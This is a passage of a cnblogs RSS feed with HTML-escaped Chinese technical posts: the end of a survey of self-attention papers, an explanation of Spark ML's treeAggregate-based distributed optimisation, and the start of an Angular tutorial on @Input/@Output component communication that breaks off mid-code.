&lt;p&gt;&lt;span&gt;&lt;span&gt;在模型的超参实验中可以看到，多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的超参&lt;/span&gt;&lt;span&gt;h&lt;/span&gt;&lt;span&gt;太小也不好，太大也会下降。整体更大的模型比小模型要好，使用&lt;/span&gt;&lt;span&gt;dropout&lt;/span&gt;&lt;span&gt;可以帮助过拟合。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114525134-864293446.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;作者还将这个模型应用到了句法分析任务上也取得了不错的结果。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114525734-1524543260.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;最后我们看一下&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;可视化的效果（这里不同颜色代表&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;不同头的结果，颜色越深&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;值越大）。可以看到&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;在这里可以学习到句子内部长距离依赖&quot;&lt;/span&gt;&lt;span&gt;making…….more difficult&lt;/span&gt;&lt;span&gt;&quot;这个短语。在两个头和单头的比较中，可以看到单头&quot;&lt;/span&gt;&lt;span&gt;its&lt;/span&gt;&lt;span&gt;&quot;这个词只能学习到&quot;&lt;/span&gt;&lt;span&gt;law&lt;/span&gt;&lt;span&gt;&quot;的依赖关系，而两个头&quot;&lt;/span&gt;&lt;span&gt;its&lt;/span&gt;&lt;span&gt;&quot;不仅学习到了&quot;&lt;/span&gt;&lt;span&gt;law&lt;/span&gt;&lt;span&gt;&quot;还学习到了&quot;&lt;/span&gt;&lt;span&gt;application&lt;/span&gt;&lt;span&gt;&quot;依赖关系。多头能够从不同的表示子空间里学习相关信息。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114526280-1061530245.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114526769-1567723009.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;&lt;span&gt;3.1 Deep Semantic Role Labeling with Self-Attention[8]&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;这篇论文来自&lt;/span&gt;&lt;span&gt;AAAI2018&lt;/span&gt;&lt;span&gt;，厦门大学&lt;/span&gt;&lt;span&gt;Tan&lt;/span&gt;&lt;span&gt;等人的工作。他们将&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;应用到了语义角色标注任务（&lt;/span&gt;&lt;span&gt;SRL&lt;/span&gt;&lt;span&gt;）上，并取得了先进的结果。这篇论文中，作者将&lt;/span&gt;&lt;span&gt;SRL&lt;/span&gt;&lt;span&gt;作为一个序列标注问题，使用&lt;/span&gt;&lt;span&gt;BIO&lt;/span&gt;&lt;span&gt;标签进行标注。然后提出使用深度注意力网络（&lt;/span&gt;&lt;span&gt;Deep Attentional Neural Network&lt;/span&gt;&lt;span&gt;）进行标注，网络结构如下。在每一个网络块中，有一个&lt;/span&gt;&lt;span&gt;RNN/CNN/FNN&lt;/span&gt;&lt;span&gt;子层和一个&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;子层组成。最后直接利用&lt;/span&gt;&lt;span&gt;softmax&lt;/span&gt;&lt;span&gt;当成标签分类进行序列标注。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114527363-1087338716.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;该模型在&lt;/span&gt;&lt;span&gt;CoNLL-2005&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;CoNll-2012&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;SRL&lt;/span&gt;&lt;span&gt;数据集上都取得了先进结果。我们知道序列标注问题中，标签之间是有依赖关系的，比如标签&lt;/span&gt;&lt;span&gt;I&lt;/span&gt;&lt;span&gt;，应该是出现在标签&lt;/span&gt;&lt;span&gt;B&lt;/span&gt;&lt;span&gt;之后，而不应该出现在&lt;/span&gt;&lt;span&gt;O&lt;/span&gt;&lt;span&gt;之后。目前主流的序列标注模型是&lt;/span&gt;&lt;span&gt;BiLSTM-CRF&lt;/span&gt;&lt;span&gt;模型，利用&lt;/span&gt;&lt;span&gt;CRF&lt;/span&gt;&lt;span&gt;进行全局标签优化。在对比实验中，&lt;/span&gt;&lt;span&gt;He et al&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;Zhou and Xu&lt;/span&gt;&lt;span&gt;的模型分别使用了&lt;/span&gt;&lt;span&gt;CRF&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;constrained decoding&lt;/span&gt;&lt;span&gt;来处理这个问题。可以看到本论文仅使用&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;，作者认为在模型的顶层的&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;层能够学习到标签潜在的依赖信息。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114527802-1377978076.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114528400-1786230297.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;3.2 Simultaneously Self-Attending to All Mentions for Full-Abstract Biological Relation Extraction[7]&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;这篇论文是&lt;/span&gt;&lt;span&gt;Andrew McCallum&lt;/span&gt;&lt;span&gt;团队应用&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;在生物医学关系抽取任务上的一个工作，应该是已经被&lt;/span&gt;&lt;span&gt;NAACL2018&lt;/span&gt;&lt;span&gt;接收。这篇论文作者提出了一个文档级别的生物关系抽取模型，里面做了不少工作，感兴趣的读者可以更深入阅读原文。我们这里只简单提一下他们&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;的应用部分。论文模型的整体结构如下图，他们也是使用&lt;/span&gt;&lt;span&gt;google&lt;/span&gt;&lt;span&gt;提出包含&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;transformer&lt;/span&gt;&lt;span&gt;来对输入文本进行表示学习，和原始的&lt;/span&gt;&lt;span&gt;transformer&lt;/span&gt;&lt;span&gt;略有不同在于他们使用了窗口大小为&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;CNN&lt;/span&gt;&lt;span&gt;代替了原始&lt;/span&gt;&lt;span&gt;FNN&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114528889-208092061.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;我们关注一下&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;这部分的实验结果。他们在生物医学药物致病数据集上（&lt;/span&gt;&lt;span&gt;Chemical Disease Relations&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;CDR&lt;/span&gt;&lt;span&gt;）取得了先进结果。去掉&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;这层以后可以看到结果大幅度下降，而且使用窗口大小为&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;CNN&lt;/span&gt;&lt;span&gt;比原始的&lt;/span&gt;&lt;span&gt;FNN&lt;/span&gt;&lt;span&gt;在这个数据集上有更突出的表现。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114529443-197783232.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;最后进行一下总结，&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;可以是一般&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的一种特殊情况，在&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;中，&lt;/span&gt;&lt;span&gt;Q=K=V&lt;/span&gt;&lt;span&gt;每个序列中的单元和该序列中所有单元进行&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;计算。&lt;/span&gt;&lt;span&gt;Google&lt;/span&gt;&lt;span&gt;提出的多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;通过计算多次来捕获不同子空间上的相关信息。&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;的特点在于无视词之间的距离直接计算依赖关系，能够学习一个句子的内部结构，实现也较为简单并行可以并行计算。从一些论文中看到，&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;可以当成一个层和&lt;/span&gt;&lt;span&gt;RNN&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;CNN&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;FNN&lt;/span&gt;&lt;span&gt;等配合使用，成功应用于其他&lt;/span&gt;&lt;span&gt;NLP&lt;/span&gt;&lt;span&gt;任务。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114529691-196895288.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;除了&lt;/span&gt;&lt;span&gt;Google&lt;/span&gt;&lt;span&gt;提出的自注意力机制，目前也有不少其他相关工作，感兴趣的读者可以继续阅读。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114530040-1649293268.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;参考文献&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[1] Vaswani, Ashish, et al. &lt;strong&gt;Attention is all you need&lt;/strong&gt;. Advances in Neural Information Processing Systems. 2017.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[2] Romain Paulus, Caiming Xiong, and Richard Socher&lt;strong&gt;. A deep reinforced model for abstractive summarization&lt;/strong&gt;. arXiv preprint arXiv:1705.04304, 2017.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[3] Zhouhan Lin, Minwei Feng, Cicero Nogueira dos Santos, Mo Yu, Bing Xiang, Bowen Zhou, and Yoshua Bengio. &lt;strong&gt;A structured self-attentive sentence embedding&lt;/strong&gt;. arXiv preprint arXiv:1703.03130, 2017.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[4] Jianpeng Cheng, Li Dong, and Mirella Lapata. &lt;strong&gt;Long short-term memory-networks for machine reading&lt;/strong&gt;. arXiv preprint arXiv:1601.06733, 2016.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[5] Shen, T.; Zhou, T.; Long, G.; Jiang, J.; Pan, S.; and Zhang, C. &lt;strong&gt;Disan: Directional self-attention network for rnn/cnn-free language understanding.&lt;/strong&gt; arXiv preprint arXiv:1709.04696, 2017.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[6] Im, Jinbae, and Sungzoon Cho. &lt;strong&gt;Distance-based Self-Attention Network for Natural Language Inference&lt;/strong&gt;. &lt;em&gt;arXiv preprint arXiv:1712.02047&lt;/em&gt;, 2017.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[7] Verga P, Strubell E, McCallum A. &lt;strong&gt;Simultaneously Self-Attending to All Mentions for Full-Abstract Biological Relation Extraction&lt;/strong&gt;. arXiv preprint arXiv:1802.10569, 2018.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[8] Tan Z, Wang M, Xie J, et al. &lt;strong&gt;Deep Semantic Role Labeling with Self-Attention&lt;/strong&gt;. AAAI 2018.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[9] Shaw, Peter, Jakob Uszkoreit, and Ashish Vaswani. &lt;strong&gt;Self-Attention with Relative Position Representations&lt;/strong&gt;. &lt;em&gt;arXiv preprint arXiv:1803.02155&lt;/em&gt; ,2018.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;参考博客&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;张俊林，深度学习中的注意力机制&lt;/span&gt;&lt;span&gt;(2017&lt;/span&gt;&lt;span&gt;版&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;https://blog.csdn.net/malefactor/article/details/78767781&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;苏剑林，《&lt;/span&gt;&lt;span&gt;Attention is All You Need&lt;/span&gt;&lt;span&gt;》浅读（简介&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;代码），&lt;/span&gt;&lt;span&gt;https://kexue.fm/archives/4765&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 03:46:00 +0000</pubDate>
<dc:creator>robert_ai</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/robert-dlut/p/8638283.html</dc:identifier>
</item>
<item>
<title>Spark ML源码分析之二 从单机到分布式 - jicanghai</title>
<link>http://www.cnblogs.com/jicanghai/p/8638245.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jicanghai/p/8638245.html</guid>
<description>&lt;div readability=&quot;8.0658436213992&quot;&gt;        前一节从宏观角度给大家介绍了Spark ML的设计框架（链接：&lt;a href=&quot;http://www.cnblogs.com/jicanghai/p/8570805.html&quot;&gt;http://www.cnblogs.com/jicanghai/p/8570805.html&lt;/a&gt;），本节我们将介绍，Spark ML中，机器学习问题从单机到分布式转换的核心方法。&lt;/div&gt;
&lt;p&gt;        单机时代，如果我们想解决一个机器学习的优化问题，最重要的就是根据训练数据，计算损失函数和梯度。由于是单机环境，什么都好说，只要公式推导没错，浮点数计算溢出问题解决好，就好了。但是，当我们的训练数据量足够大，大到单机根本存储不下的时候，对分布式学习的需求就出现了。比如电商数据，动辄上亿的训练数据量，单机望尘莫及，只能求助于分布式计算。&lt;/p&gt;
&lt;p&gt;        那么问题来了，在分布式计算中，怎样计算得到损失函数的值，以及它的梯度值呢？这就涉及到Spark ml的一个核心，用八个字概括就是，模型集中，计算分布。具体来说，比如我们要学习一个逻辑回归模型，它的训练数据可能是存储在成百上千台服务器上，但具体的模型，只集中于一台服务器上。每次迭代时，我们现在训练数据所在的服务器上，并行的计算出，每个服务器包含的训练数据，所对应的损失函数值和梯度值，然后把这些信息集中在模型所在的机器上，进行合并，总结出所有训练数据的损失函数值和梯度值，然后对所学习的参数进行迭代，并把参数分发给拥有训练数据的服务器，并进入下一个迭代循环，直到模型收敛。&lt;/p&gt;
&lt;p&gt;        如此看来，分布式机器学习也没有什么特别的，核心问题就在于，怎样把每个服务器上计算的损失函数值和地图值集中到模型所在的服务器上，除此之外，跟单机的机器学习问题并没有什么不同。&lt;/p&gt;
&lt;p&gt;        这一步，在Spark ML中是如何实现的呢？这里要隆重介绍一个函数，treeAggregate，在我看来，这个函数是从单机到分布式机器学习的核心，理解了这个函数，分布式机器学习问题，就理解大半了。&lt;/p&gt;
&lt;p&gt;        treeAggregate函数主要做什么呢？它负责把每一台服务器上的信息进行聚合，然后汇总给模型所在的服务器。拥有训练数据的服务器，可能动辄成千上万，这么多数据怎样聚合起来呢？其实函数名字已经有暗示了，它用的是树形聚合方法。假设我们有32台服务器，如果使用线性聚合，也就是说，1跟2合并，结果再跟3合并，这样一共需要进行31次合并，而且每次合并还不能并行进行，因此treeAggregate采用的方法是，把32个节点分配到一颗二叉树的32个叶子节点，然后从叶子节点开始一层一层的聚合，这样只需要5次聚合就可以了。&lt;/p&gt;
&lt;p&gt;        具体的，使用treeAggregate函数需要定义两种运算，分别是seqOp和combOp，前者的作用是，把一个训练样本加入已有的统计，即对损失函数值和梯度进行更新，后者的作用是，把两个统计信息合并起来，可以这样理解，前者主要在单机上的统计计算时起作用，后者主要是在不同服务器进行数据合并时起作用。&lt;/p&gt;
&lt;p&gt;        有了这些核心概念，就可以进入optim目录去一探究竟了，optim目录是Spark ML跟优化相关内容的代码库，它主要包含三部分，一是aggregator目录，二是loss目录，三是根目录，下面我们逐一介绍。&lt;/p&gt;
&lt;p&gt;        aggregator目录下存放的是，聚合相关的代码。我们知道在机器学习任务中，不同的任务需要聚合的信息是不一样的。这里就为我们实现了几个最基本的聚合操作。其中，DifferentiableLossAggregator是基类，顾名思义，实现了最基本的可微损失函数的聚合，实际上的聚合操作都是由它的子类完成的，基类中定义了通用的merge操作，具体的add操作由各子类自己定义，代码实现都比较直接，就不一一介绍了，感兴趣的朋友可以直接读源码。&lt;/p&gt;
&lt;p&gt;        loss目录下存放的是，损失函数相关的代码。其实，最一般性的损失函数是在breeze库中定义的，这个等我们在介绍breeze库的时候再细说。loss目录下有两个文件，一个是DifferentiableRegularization.scala，这里是把正则也当作一种损失，主要包含L2正则，另一个是RDDLossFunction.scala，这个就非常重要了，它就是应用treeAggregate函数，从单机的损失+梯度，汇总到分布式版的损失+梯度的函数，它主要应用了aggregate目录下的聚合类实现分布式的聚合运算。&lt;/p&gt;
&lt;p&gt;        根目录下主要包含了几个优化问题的解法，最基础的是NormalEquationSolver.scala，它主要描述了一个最小二乘的标准解法，也就是正规方程的解法，其次是WeightedLeastSquares.scala，它解决了一个带权值的最小二乘问题，利用了正规方程解法，最后是IterativelyReweightedLeastSquares.scala，这是在解逻辑斯蒂回归等一大类一般性线性回归问题中常用的IRLS算法，利用了带权值的最小二乘解法。&lt;/p&gt;
&lt;p&gt;        好，今天的介绍就到这里了。作者也是初学者，欢迎大家批评指正。&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 03:36:00 +0000</pubDate>
<dc:creator>jicanghai</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jicanghai/p/8638245.html</dc:identifier>
</item>
<item>
<title>Angular组件——父子组件通讯 - starof</title>
<link>http://www.cnblogs.com/starof/p/8636579.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/starof/p/8636579.html</guid>
<description>&lt;p&gt;Angular组件间通讯&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/315302/201803/315302-20180324085613865-1312166301.png&quot; alt=&quot;&quot; width=&quot;256&quot; height=&quot;178&quot;/&gt;&lt;/p&gt;
&lt;p&gt;组件树，1号是根组件AppComponent。&lt;/p&gt;
&lt;p&gt;组件之间松耦合，组件之间知道的越少越好。&lt;/p&gt;
&lt;p&gt;组件4里面点击按钮，触发组件5的初始化逻辑。&lt;/p&gt;
&lt;p&gt;传统做法：在按钮4的点击事件里调用组件5的方法。紧密耦合。&lt;/p&gt;
&lt;p&gt;Angular：在组件4根本不知道组件5存在的情况下实现。&lt;/p&gt;
&lt;p&gt;使用松耦合的方式在组件之间传递数据开发出高重用性的组件。&lt;/p&gt;
&lt;p&gt;使用输入输出属性在父子关系的组件之间传递数据。&lt;/p&gt;

&lt;p&gt;组件设计成黑盒模型，用输入属性声明从外部世界接收什么东西。不需要知道这些东西从哪里来来。&lt;/p&gt;
&lt;p&gt;组件只需要知道当它需要的东西外部世界提供给它以后它应该怎么做。&lt;/p&gt;
&lt;p&gt;组件通过输出属性发射事件告诉外部世界可能感兴趣的东西。至于事件发射给谁组件也不需要知道。&lt;/p&gt;
&lt;p&gt;谁感兴趣谁自己订阅组件发射的事件。&lt;/p&gt;

&lt;p&gt;子组件定义了2个输入属性，被@Input()装饰器装饰的属性。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  @Input()
  stockCode:string;
  @Input()
  amount:number;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;父组件通过&lt;strong&gt;属性绑定到子组件输入属性&lt;/strong&gt;的方式把stock属性绑定到子组件的stockCode属性上。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
  我是父组件
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text&quot;&lt;/span&gt;&lt;span&gt; [(ngModel)]&lt;/span&gt;&lt;span&gt;=&quot;stock&quot;&lt;/span&gt;&lt;span&gt; placeholder&lt;/span&gt;&lt;span&gt;=&quot;请输入股票代码&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;app-order &lt;/span&gt;&lt;span&gt;[stockCode]&lt;/span&gt;&lt;span&gt;=stock &lt;/span&gt;&lt;span&gt;[amount]&lt;/span&gt;&lt;span&gt;=&quot;100&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;app-order&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/315302/201803/315302-20180324093524908-547013260.png&quot; alt=&quot;&quot; width=&quot;190&quot; height=&quot;121&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 每隔3s重置子组件的stockCode的值为Apple。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
export &lt;span&gt;class&lt;/span&gt; OrderComponent &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; OnInit {

  @Input()
  stockCode:string;
  @Input()
  amount:&lt;/span&gt;&lt;span&gt;number&lt;/span&gt;&lt;span&gt;;

  constructor() { 
    setInterval(()&lt;/span&gt;=&amp;gt;&lt;span&gt;{
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.stockCode=&lt;span&gt;'Apple'&lt;/span&gt;&lt;span&gt;
    },&lt;/span&gt;3000&lt;span&gt;)
  }

  ngOnInit() {
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当子组件的stockCode的值变为Apple的时候，父组件的stock的值并没有改变。说明绑定是单向的，只能是父组件改变子组件，子组件属性改变不会影响到父组件。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/315302/201803/315302-20180324101125414-620878762.png&quot; alt=&quot;&quot; width=&quot;201&quot; height=&quot;119&quot;/&gt;&lt;/p&gt;

&lt;p&gt;Angular组件可以使用EventEmitter对象发射自定义事件，这些事件可以被其它组件处理。 EventEmitter是Rxjs中Subject类的一个子类，在响应式编程中，它既可以作为被观察者，也可以作为观察者。就是说EventEmitter对象即可以通过它的emit方法发射自定义事件，也可以通过subscribe方法来订阅EventEmitter发射出来的事件流。&lt;/p&gt;
&lt;p&gt;如何使用EventEmit从组件内部向外发射事件？&lt;/p&gt;
&lt;p&gt;例子场景：报价组件&lt;/p&gt;
&lt;p&gt;假设需要一个组件，可以连接到股票交易所，并且实时的显示变动的股票价格，为了让这个组件可以在不同的金融类的应用中重用，除了实时显示股票价格，组件还应该将最新的股票价格发送到组件之外，这样其它的组件就可以针对变动的股票价格执行相应的业务逻辑。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Note&lt;/strong&gt;&lt;/span&gt;：将特定的数据结构用类或接口来明确定义是一个良好的习惯&lt;/p&gt;
&lt;h2&gt;1、先模拟一个实时变动的IBM的股票价格&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
export &lt;span&gt;class&lt;/span&gt; PriceQuoteComponent &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; OnInit {

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;不连接股票服务，用一个随机数生成器模拟股票价格的变化，并将股票代码和最新的价格显示出来&lt;/span&gt;
&lt;span&gt;
  stockCode:string&lt;/span&gt;=&lt;span&gt;&quot;IBM&quot;&lt;/span&gt;&lt;span&gt;;
  price:&lt;/span&gt;&lt;span&gt;number&lt;/span&gt;&lt;span&gt;;

  constructor() {
    setInterval(()&lt;/span&gt;=&amp;gt;&lt;span&gt;{
      let priceQuote:PriceQuote&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt; PriceQuote(&lt;span&gt;this&lt;/span&gt;.stockCode,100*&lt;span&gt;Math.random());
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.price=&lt;span&gt;priceQuote.lastPrice;
    },&lt;/span&gt;1000&lt;span&gt;)
  }

  ngOnInit() {
  }

}


&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;封装一个报价对象来封装股票价格信息&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;将特定的数据结构用类或接口来明确定义是一个良好的习惯&lt;/span&gt;
export &lt;span&gt;class&lt;/span&gt;&lt;span&gt; PriceQuote {
  constructor(&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; stockCode: string, &lt;span&gt;//&lt;/span&gt;&lt;span&gt;股票代码&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; lastPrice: &lt;span&gt;number&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;最新价格&lt;/span&gt;
&lt;span&gt;  ) {
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/315302/201803/315302-20180324105201242-1045036906.png&quot; alt=&quot;&quot; width=&quot;272&quot; height=&quot;47&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;2、把信息输出出去，告诉组件外部，谁感兴趣谁来订阅&lt;/h2&gt;
&lt;p&gt;EventEmit后面的范型是要往出发射的事件的数据是什么类型的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt; { Component, OnInit, EventEmitter, Output } from &lt;span&gt;'@angular/core'&lt;/span&gt;&lt;span&gt;;

@Component({
  selector: &lt;/span&gt;&lt;span&gt;'app-price-quote'&lt;/span&gt;&lt;span&gt;,
  templateUrl: &lt;/span&gt;&lt;span&gt;'./price-quote.component.html'&lt;/span&gt;&lt;span&gt;,
  styleUrls: [&lt;/span&gt;&lt;span&gt;'./price-quote.component.css'&lt;/span&gt;&lt;span&gt;]
})
export &lt;/span&gt;&lt;span&gt;class&lt;/span&gt; PriceQuoteComponent &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; OnInit {

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;不连接股票服务，用一个随机数生成器模拟股票价格的变化，并将股票代码和最新的价格显示出来&lt;/span&gt;
&lt;span&gt;
  stockCode: string &lt;/span&gt;= &lt;span&gt;&quot;IBM&quot;&lt;/span&gt;&lt;span&gt;;
  price: &lt;/span&gt;&lt;span&gt;number&lt;/span&gt;&lt;span&gt;;

  @Output() &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发射事件需要写上Output&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;EventEmitter需要一个范型&lt;/span&gt;
